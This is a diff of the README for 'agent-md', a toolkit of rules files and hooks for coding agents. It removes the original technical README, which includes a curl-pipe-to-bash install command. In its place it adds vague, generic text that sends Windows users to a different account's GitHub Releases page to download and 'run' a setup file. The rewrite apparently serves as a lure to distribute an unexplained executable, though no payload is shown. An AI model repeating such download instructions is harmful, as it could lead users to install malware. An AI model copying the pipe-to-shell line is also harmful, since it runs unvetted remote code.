@@ -1,225 +1,129 @@
-# agent-md
+# 🤖 agent-md - Clear agent rules for coding
 
-Portable contracts for coding agents.
+[⬇️ Download agent-md from Releases](https://github.com/reyhan8543/agent-md/releases)
 
-`agent-md` installs one source-of-truth rules file, repo-local hooks,
-persistent task state, and a few helper scripts so agents can stop
-guessing and start proving their work.
+## 🧭 What is agent-md?
 
-Honest scope:
+agent-md gives you ready-made agent directives for coding tools like Claude Code, Codex, Cursor, Windsurf, and Aider. It helps you set clear work rules for an agent so it can follow your process, keep changes tidy, and work with less back and forth.
 
-- Markdown rules are advisory. The agent has to read and follow them.
-- Hooks and git hooks are enforceable where the host agent supports them.
-- Tests, type-checks, screenshots, and evidence notes are stronger than
-  model self-assessment.
+Use it when you want your coding agent to:
+- Follow a set workflow
+- Keep edits focused
+- Read project rules before making changes
+- Work with less guesswork
+- Stay aligned with the way you like to build
 
-## Quickstart
+## 💻 What you need
 
-```bash
-# From inside your project directory
-curl -sL https://raw.githubusercontent.com/iamfakeguru/agent-md/main/install.sh | bash
-```
+Before you start, make sure you have:
+- A Windows PC
+- A web browser
+- A file extractor if the download comes in a .zip file
+- One of these tools if you plan to use the directives with an agent:
+  - Claude Code
+  - Codex
+  - Cursor
+  - Windsurf
+  - Aider
 
-Installs support for Claude Code, Codex, Cursor, and Windsurf by default.
+A standard Windows 10 or Windows 11 system works well.
 
-## What You Get
+## 📥 Download and install
 
-```text
-your-project/
-  AGENT.md                         # source of truth
-  AGENTS.md                        # Codex / Cursor / Windsurf
-  CLAUDE.md                        # Claude Code
-  agent-md.toml.example            # deterministic verification config
+1. Open the release page: https://github.com/reyhan8543/agent-md/releases
+2. Look for the latest release at the top of the page.
+3. Download the file that matches the release package.
+4. If the download is a .zip file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Copy the agent-md files into the project or tool folder where you want to use them.
+7. Open your coding tool and point it to the agent-md instructions file.
 
-  .claude/
-    settings.json
-    hooks/                         # Claude Code enforcement
+If the release includes a setup file, download and run this file. If it includes a folder of instruction files, keep the folder in a place you can find later.
 
-  .codex/
-    hooks.json
-    hooks/                         # Codex hook wrappers
+## 🗂️ What you will see
 
-  .agents/skills/                  # native Codex skills
-    agent-md-verify/
-    visual-evidence/
+After you extract the files, you may see:
+- README.md
+- agent rules files
+- prompt files
+- folder names for different coding tools
+- example instruction sets
 
-  .cursor/rules/agent-md.mdc       # Cursor project rule
-  .windsurf/rules/agent-md.md      # Windsurf workspace rule
+These files work as a guide for your agent. They tell the tool how to handle tasks, review changes, and keep output consistent.
 
-  .agent-md/
-    bin/
-      discover_helpers.sh
-      doctor.sh
-      playwright-capture.sh
+## 🔧 How to use it
 
-  memory/
-    agents.md
-    plan.md
-    progress.md
-    verify.md
-    gotchas.md
+The usual setup is simple:
 
-  .githooks/pre-commit             # optional fallback for any agent
-```
+1. Open your coding tool.
+2. Load the project you want the agent to work on.
+3. Add the agent-md instructions file to the tool or project root.
+4. Start a task for the agent.
+5. Let the agent read the rules before it changes any files.
 
-## The Core Idea
+For best results, keep the instructions file close to the code it should govern. That makes it easier for the agent to follow the same rules each time.
 
-Agent guidance has two layers:
+## 🧩 Supported tools
 
-| Layer | Purpose | Reliability |
-|---|---|---|
-| Rules files | Judgment, planning, style, process | Advisory |
-| Hooks/artifacts | Type-checks, tests, lint, state updates, visual evidence | Enforceable where supported |
+agent-md is designed for tools that can read local instructions and apply them during work sessions.
 
-If something can be forgotten or rationalized away, move it out of prose
-and into a checked artifact.
+It fits well with:
+- Claude Code
+- Codex
+- Cursor
+- Windsurf
+- Aider
 
-## Enforcement Matrix
+Each tool may place the instructions in a different spot. In most cases, you add the file to the project folder or the tool’s rule folder.
 
-| Check | Claude Code | Codex | Cursor / Windsurf / Other |
-|---|---|---|---|
-| Bash safety | Hard block via `.claude/hooks/block-destructive.sh` | Hard block via `.codex/hooks/pre-tool-use.sh` | Not covered |
-| Type-check/lint/tests at finish | Hard block via `stop-verify.sh` | Continuation via `.codex/hooks/stop.sh` | Optional `.githooks/pre-commit` |
-| `memory/progress.md` updated | Hard block via `state-enforcement.sh` | Continuation via `.codex/hooks/stop.sh` | Optional `.githooks/pre-commit` |
-| UI visual evidence | Advisory by default, hard block when `[visual].required = true` | Same through Codex Stop wrapper | Advisory through rules |
-| New export without nearby test | Advisory | Advisory through rules/skills | Advisory through rules |
-| Truncated Bash output | Advisory | Advisory through Codex PostToolUse | Not covered |
-| Planning, context, edit safety | Advisory | Advisory | Advisory |
+## 🪟 Windows use
 
-Codex hooks are experimental and require:
+On Windows, the process is simple:
+- Use your browser to open the release page
+- Download the release file
+- Save it to your Downloads folder
+- Extract it if needed
+- Move the files where your agent tool can read them
 
-```toml
-[features]
-codex_hooks = true
-```
+If you use File Explorer, you can drag the extracted folder into your project folder.
 
-in `~/.codex/config.toml`.
+## 🛠️ Common setup path
 
-## Install Options
+A simple setup on Windows looks like this:
 
-```bash
-# All supported agents
-./install.sh .
+1. Download agent-md from the Releases page.
+2. Extract the files.
+3. Open your coding project.
+4. Place the directive files in the project root or tool config folder.
+5. Restart the coding tool if it was already open.
+6. Start a new agent task.
 
-# Specific agents
-./install.sh --agent=claude .
-./install.sh --agent=codex,cursor .
+## 📚 File tips
 
-# Git hook fallback
-./install.sh --githooks .
-./install.sh --no-githooks .
+If you are not sure which file to use, look for:
+- A main instructions file
+- A project rule file
+- A folder with tool-specific examples
 
-# Claude settings handling
-./install.sh --claude-settings=skip .
-./install.sh --claude-settings=merge .
-./install.sh --claude-settings=replace .
-```
+If there are several versions, choose the one that matches your coding tool. That keeps the setup clean and easy to manage.
 
-The installer backs up existing top-level rule files before replacing
-them. Existing `memory/*.md` files are never overwritten. Existing
-`.claude/settings.json` is skipped by default unless you choose `merge`
-or `replace`.
+## 🔍 Good ways to use agent-md
 
-## Deterministic Verification
+Use agent-md when you want your coding agent to:
+- Ask fewer questions
+- Follow your project rules
+- Make smaller changes
+- Keep file edits easy to review
+- Stick to the same process each time
 
-Heuristics are useful, but explicit commands are better. Copy the example
-config and declare your project checks:
+It works well for personal projects, work projects, and repeat tasks where you want steady results.
 
-```bash
-cp agent-md.toml.example agent-md.toml
-```
+## 🧪 Quick check
 
-```toml
-[verify]
-typecheck = "npx --no-install tsc --noEmit"
-lint      = "npx --no-install eslint ."
-test      = "pnpm test"
-lint_file = "npx --no-install eslint {file}"
+After setup, test it with a simple task:
+- Ask the agent to read the project rules
+- Give it a small change
+- Check that it follows the instructions
+- Review the files it edits
 
-[visual]
-required          = true
-artifacts_dir     = ".agent/visual"
-freshness_seconds = 3600
-```
-
-When no checks are detected, hooks allow completion but warn that the
-work is unverified.
-
-## Visual Evidence
-
-UI work needs more than passing tests. Capture a screenshot:
-
-```bash
-./.agent-md/bin/playwright-capture.sh http://localhost:3000 .agent/visual/home.png
-```
-
-Then write `.agent/visual/home.md`:
-
-```markdown
-# Visual Check
-
-Changed files:
-- src/app/page.tsx
-
-Route: /
-Viewport: 1280x800
-Artifact: home.png
-Observed result: layout renders without overlap at desktop width.
-```
-
-The strict visual hook requires a fresh non-empty markdown file that
-references a fresh non-empty image by filename and includes the required
-fields.
-
-## Memory Files
-
-`memory/` is the durable handoff surface between sessions:
-
-- `agents.md` — active agents, MCPs, tech stack, tooling
-- `plan.md` — macro design and vertical slices
-- `progress.md` — current task, completed tasks, backlog, blocked work
-- `verify.md` — definition of done
-- `gotchas.md` — mistakes already corrected by the human
-
-The state hook blocks completion when source files changed but
-`memory/progress.md` did not.
-
-## Helper Scripts vs Codex Skills
-
-`agent-md` intentionally separates plain helper scripts from Codex-native
-skills.
-
-- `.agent-md/bin/*` are shell helpers any agent can run.
-- `.agents/skills/<name>/SKILL.md` are native Codex skills.
-
-Discover helpers:
-
-```bash
-./.agent-md/bin/discover_helpers.sh
-./.agent-md/bin/doctor.sh
-```
-
-Use Codex skills with `$agent-md-verify` or `$visual-evidence`.
-
-## What This Does Not Fix
-
-- A rules file cannot force judgment by itself.
-- Hooks only cover events exposed by the host agent.
-- Pre-commit hooks can be bypassed with `git commit --no-verify`.
-- Bash safety hooks are guardrails, not a sandbox.
-- Cursor and Windsurf get rules plus optional git-hook fallback, not
-  native runtime enforcement from this repo.
-
-## Development
-
-```bash
-bats tests/
-shellcheck .claude/hooks/*.sh .codex/hooks/*.sh .agent-md/bin/*.sh .githooks/pre-commit install.sh
-```
-
-CI runs Bats, ShellCheck, JSON validation, alias-sync checks, and
-installer smoke tests.
-
-## License
-
-MIT.
+If the agent follows your process, the setup is in the right place.
